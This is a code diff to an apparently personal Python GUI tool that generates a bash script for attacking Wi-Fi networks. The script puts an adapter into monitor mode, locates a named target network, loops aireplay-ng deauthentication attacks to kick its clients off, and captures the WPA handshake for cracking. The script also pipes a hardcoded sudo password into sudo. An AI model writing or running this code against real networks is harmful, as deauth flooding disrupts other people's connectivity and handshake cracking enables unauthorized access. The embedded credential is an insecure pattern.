@@ -1107,51 +1107,69 @@ class MaximWindow(QMainWindow):
         # wlan1 = integrated adapter (connected — never touch for monitor mode)
         other_iface = "wlan1"
 
+        # Manual airodump + aireplay — NO wifite, NO airmon-ng, NO --kill
+        # Only touches wlan0. wlan1 and NetworkManager completely untouched.
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
         script.write("#!/bin/bash\n")
         script.write("echo '5505' | sudo -S -v 2>/dev/null\n")
         script.write(f"mkdir -p '{essid_dir}'\n")
-        script.write(f"rm -f '{signal_file}'\n")
-        script.write(f"cd '{essid_dir}'\n")
-        # Timestamp marker so we can find files created during this session
-        script.write("touch /tmp/maxim_capture_start\n\n")
+        script.write(f"rm -f '{signal_file}'\n\n")
 
-        # Save the integrated adapter's active connection before wifite kills NetworkManager
-        script.write(f"SAVED_CON=$(nmcli -t -f NAME,DEVICE con show --active 2>/dev/null | grep '{other_iface}' | cut -d: -f1)\n")
-        script.write(f"echo 'USB adapter: {iface} (attack)'\n")
-        script.write(f"echo 'Integrated adapter: {other_iface} (protected)'\n")
-        script.write("echo \"Active connection: $SAVED_CON\"\necho\n\n")
+        # Monitor mode on wlan0 only
+        script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
+        script.write(f"sudo iw dev {iface} set type monitor 2>/dev/null\n")
+        script.write(f"sudo ip link set {iface} up 2>/dev/null\n\n")
 
-        # Run wifite with --kill (needed for deauth to work)
-        script.write(f"sudo wifite -i {iface} --essid '{essid}' --kill --wpa --no-pmkid --num-deauths 10\n\n")
+        # Quick scan to find BSSID+channel using iw (managed mode not needed —
+        # we can use airodump silently since wlan0 is the USB adapter, not connected to anything)
+        scan_csv = "/tmp/maxim_hscan"
+        script.write(f"rm -f {scan_csv}-* 2>/dev/null\n")
+        script.write(f"echo '[1/3] Scanning for {essid}...'\n")
+        script.write("BSSID=''\nCHANNEL=''\n")
+        script.write("for i in 1 2 3; do\n")
+        script.write(f"  echo \"  Attempt $i/3\"\n")
+        script.write(f"  sudo timeout 15 airodump-ng -w '{scan_csv}' --output-format csv --write-interval 1 {iface} >/dev/null 2>&1\n")
+        script.write(f"  CSV=$(ls -t {scan_csv}-*.csv 2>/dev/null | head -1)\n")
+        script.write("  if [ -n \"$CSV\" ]; then\n")
+        script.write(f"    LINE=$(grep -i '{essid}' \"$CSV\" | grep -E '^[0-9A-Fa-f]{{2}}:' | head -1)\n")
+        script.write("    if [ -n \"$LINE\" ]; then\n")
+        script.write("      BSSID=$(echo \"$LINE\" | cut -d, -f1 | tr -d ' ')\n")
+        script.write("      CH=$(echo \"$LINE\" | cut -d, -f4 | tr -d ' ')\n")
+        script.write("      if echo \"$CH\" | grep -qE '^[0-9]+$' && [ \"$CH\" -ge 1 ] && [ \"$CH\" -le 165 ]; then\n")
+        script.write("        CHANNEL=$CH\n")
+        script.write("      fi\n")
+        script.write("    fi\n")
+        script.write("  fi\n")
+        script.write(f"  rm -f {scan_csv}-* 2>/dev/null\n")
+        script.write("  if [ -n \"$BSSID\" ] && [ -n \"$CHANNEL\" ]; then break; fi\n")
+        script.write("done\n\n")
 
-        # Copy any .cap files wifite created into the ESSID subfolder
-        script.write(f"echo '[*] Saving capture files to {essid_dir}/'\n")
-        # wifite saves in current dir or hs/ subfolder
-        script.write(f"find . ~/hs /tmp -maxdepth 2 \\( -name '*.cap' -o -name '*.pcap' \\) -newer /tmp/maxim_capture_start -exec cp -v {{}} '{essid_dir}/' \\; 2>/dev/null\n")
-        script.write("rm -f /tmp/maxim_capture_start\n\n")
+        script.write("if [ -z \"$BSSID\" ] || [ -z \"$CHANNEL\" ]; then\n")
+        script.write(f"  echo '[!] Could not find {essid}'\n")
+        script.write(f"  echo 'FAILED' > '{signal_file}'\n")
+        script.write("  read -p 'Press Enter to close'\n  exit 1\nfi\n\n")
 
-        # Restore NetworkManager + integrated adapter connection
-        script.write("echo\necho '[*] Restoring network...'\n")
-        script.write("sudo systemctl start NetworkManager 2>/dev/null\n")
-        script.write("sleep 3\n")
-        # Restore integrated adapter to managed mode
-        script.write(f"sudo ip link set {other_iface} down 2>/dev/null\n")
-        script.write(f"sudo iw dev {other_iface} set type managed 2>/dev/null\n")
-        script.write(f"sudo ip link set {other_iface} up 2>/dev/null\n")
-        script.write("sleep 1\n")
-        # Reconnect to saved network
-        script.write("if [ -n \"$SAVED_CON\" ]; then\n")
-        script.write("  nmcli con up \"$SAVED_CON\" 2>/dev/null\n")
-        script.write("  echo \"Reconnected ${SAVED_CON} on {other_iface}\"\n")
-        script.write("else\n")
-        # If no saved connection, try to reconnect to any known network
-        script.write(f"  nmcli dev connect {other_iface} 2>/dev/null\n")
-        script.write(f"  echo 'Reconnected {other_iface}'\n")
-        script.write("fi\n\n")
+        script.write("echo \"Found: BSSID=$BSSID  Channel=$CHANNEL\"\n")
+        script.write("echo\n")
+        script.write("echo '══════════════════════════════════════════════════════════'\n")
+        script.write(f"echo '  CAPTURING HANDSHAKE: {essid}'\n")
+        script.write("echo \"  BSSID: $BSSID  Channel: $CHANNEL\"\n")
+        script.write("echo '  MAXIM auto-detects handshake → kills terminal → cracks'\n")
+        script.write("echo '══════════════════════════════════════════════════════════'\n")
+        script.write("echo\n\n")
+
+        # Background: deauth loop (targeted at BSSID, only affects clients on target network)
+        script.write("echo '[2/3] Deauthing clients on target network...'\n")
+        script.write("(\n  sleep 3\n  for j in $(seq 1 30); do\n")
+        script.write(f"    sudo aireplay-ng --deauth 5 -a $BSSID {iface} >/dev/null 2>&1\n")
+        script.write("    sleep 5\n  done\n) &\n\n")
+
+        # Foreground: capture
+        script.write(f"echo '[3/3] Capturing...'\n")
+        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' {iface}\n\n")
 
         script.write(f"echo 'DONE' > '{signal_file}'\n")
-        script.write("echo\necho 'Done.'\nread -p 'Press Enter to close'\n")
+        script.write("echo 'Capture stopped.'\nread -p 'Press Enter to close'\n")
 
         script.close()
         os.chmod(script.name, 0o755)
@@ -1291,18 +1309,6 @@ class MaximWindow(QMainWindow):
                 except Exception:
                     pass
             self.runner._terminal_proc = None
-
-        # Restore NetworkManager + integrated adapter (wifite killed it)
-        def _restore_network():
-            subprocess.run("sudo systemctl start NetworkManager", shell=True, timeout=10)
-            time.sleep(2)
-            # Reconnect integrated adapter (wlan1)
-            subprocess.run("sudo ip link set wlan1 down 2>/dev/null", shell=True, timeout=5)
-            subprocess.run("sudo iw dev wlan1 set type managed 2>/dev/null", shell=True, timeout=5)
-            subprocess.run("sudo ip link set wlan1 up 2>/dev/null", shell=True, timeout=5)
-            time.sleep(1)
-            subprocess.run("nmcli dev connect wlan1 2>/dev/null", shell=True, timeout=10)
-        threading.Thread(target=_restore_network, daemon=True).start()
 
         # Copy the .cap into the ESSID subfolder so it's organized
         import shutil
